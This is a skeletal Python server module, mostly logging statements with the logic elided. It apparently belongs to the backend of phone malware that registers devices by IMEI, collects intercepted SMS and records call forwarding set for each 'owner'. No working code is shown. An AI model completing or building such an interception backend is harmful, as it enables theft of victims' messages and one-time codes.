...
def registration(user, data):
    ...
    try:
        ...
        logger.debug(u"Phone with h/w ID {0} is already in the database".format(imei_))
        existing = True
        ...
        try:
            ...
            logger.error(u"Error creating a phone: {0}".format(e))
            raise ProcessingError("The phone is already in the database")
    logger.debug(u"Saved phone record {0}".format(rec))
...
def add_sms(rec, data):
    ...
    for s in sms:
        ...
        try:
            ...
            logger.error(u"Error while saving SMS: {0}".format(e))
...
def phone_check(data):
    ...
    try:
        ...
        logger.error(u"Phone with ID {0} does not exist".format(phone_id))
...
def intercepted_sms_in(rec, data):
    ...
    @rtype: None
    """
    logger.debug(u"Received incoming intercepted SMS for phone {0}".format(rec))
...
def intercept_status_change(rec, data):
    ...
    if rec.owner_id is None:
        logger.error(u"No owner for phone {0} currently".format(rec))
        return
    ...
    logger.debug(u"Phone {0} status changed to {1}".format(rec, new_status))
    sys_messages.add_message(rec.uniq_id, msg)
...
def appid_received(user, rec, data):
    ...
    rec.id_sent = True
    rec.save()
    logger.debug(u"Received #sentid confirmation for {0}".format(rec))
...
def cb_call_forwarding(rec, data):
    ...
    rec.save()
    logger.debug(u"Phone {0} is now forwarding calls to {1}".format(rec, number))
...
def process(request):
    if request.method == 'POST' and request.body:
        logger.debug(u"Processing API request")
        b = request.body
        code = None
        try:
            if request.META.get("HTTP_CONTENT_ENCODING") == 'gzip':
                ...
                b = f.read()
                logger.debug(u"Compressed content detected")
        except IOError:  # not compressed actually
            pass
        try:
            body_decode = b.decode('UTF-8', 'ignore')
            ...
            logger.debug(u"Processing command: {0}".format(command))
            if command == 'ping':
            ...
            if settings.LOG_CLIENT_REQUESTS:
            ...
            logger.error(u"Phone with code {0} doesn't exist".format(code))
            return HttpResponseServerError("Not found")
        except:
            logger.error(traceback.format_exc())
            return HttpResponseServerError()
        logger.debug(
            u"Responding to request from {0} with {1}".format(data.get('imei') or data.get('code'), json_response))
